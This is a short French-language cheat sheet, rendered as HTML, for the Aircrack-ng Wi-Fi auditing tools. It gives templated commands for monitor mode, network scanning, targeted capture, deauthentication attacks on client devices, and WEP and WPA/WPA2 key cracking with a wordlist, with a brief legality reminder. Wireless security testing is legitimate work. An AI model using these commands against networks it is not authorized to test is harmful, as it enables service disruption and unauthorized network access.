<!DOCTYPE html []>
<html>
  <head>
    <meta charset="UTF-8" />
    <meta name="author" content="MarkdownViewer++" />
    
  </head>
  <body>
    <h1 id="aircrack-ng-cheat-sheet">Aircrack-ng Cheat Sheet</h1>
    <h2 id="prerequis">Prérequis</h2>
    <ul>
      <li>Carte réseau supportant le mode moniteur et l'injection de paquets.</li>
      <li>Aircrack-ng installé sur votre système.</li>
    </ul>
    <h2 id="commandes-de-base">Commandes de base</h2>
    <h3 id="verifier-les-interfaces-reseau">Vérifier les interfaces réseau</h3>
    <pre>
      <code>airmon-ng
</code>
    </pre>
    <h3 id="passer-une-interface-en-mode-moniteur">Passer une interface en mode moniteur</h3>
    <pre>
      <code>airmon-ng start [interface]
</code>
    </pre>
    <h3 id="arreter-le-mode-moniteur">Arrêter le mode moniteur</h3>
    <pre>
      <code>airmon-ng stop [interface moniteur]
</code>
    </pre>
    <h3 id="lister-les-reseaux-wi-fi-disponibles">Lister les réseaux Wi-Fi disponibles</h3>
    <pre>
      <code>airodump-ng [interface moniteur]
</code>
    </pre>
    <h3 id="cibler-un-reseau-pour-la-capture">Cibler un réseau pour la capture</h3>
    <pre>
      <code>airodump-ng --bssid [BSSID du réseau] -c [canal] --write [nom du fichier de sortie] [interface moniteur]
</code>
    </pre>
    <h3 id="lancer-une-attaque-de-desauthentification">Lancer une attaque de désauthentification</h3>
    <pre>
      <code>aireplay-ng --deauth [nombre de paquets] -a [BSSID du routeur] -c [BSSID de la victime] [interface moniteur]
</code>
    </pre>
    <h3 id="craquer-une-cle-wep">Craquer une clé WEP</h3>
    <pre>
      <code>aircrack-ng -a 1 -b [BSSID du réseau] [fichier de capture]
</code>
    </pre>
    <h3 id="craquer-une-cle-wpawpa2-avec-un-fichier-de-dictionnaire">Craquer une clé WPA/WPA2 avec un fichier de dictionnaire</h3>
    <pre>
      <code>aircrack-ng -a 2 -b [BSSID du réseau] -w [chemin du fichier de dictionnaire] [fichier de capture]
</code>
    </pre>
    <h2 id="astuces">Astuces</h2>
    <ul>
      <li>Toujours utiliser Aircrack-ng dans un cadre légal. L'accès non autorisé à des réseaux est illégal.</li>
      <li>La qualité et la taille du fichier de dictionnaire peuvent grandement affecter le temps nécessaire pour craquer une clé WPA/WPA2.</li>
      <li>Pour augmenter les chances de succès lors de l'attaque de désauthentification, assurez-vous d'être physiquement proche du réseau cible.</li>
    </ul>
  </body>
</html>
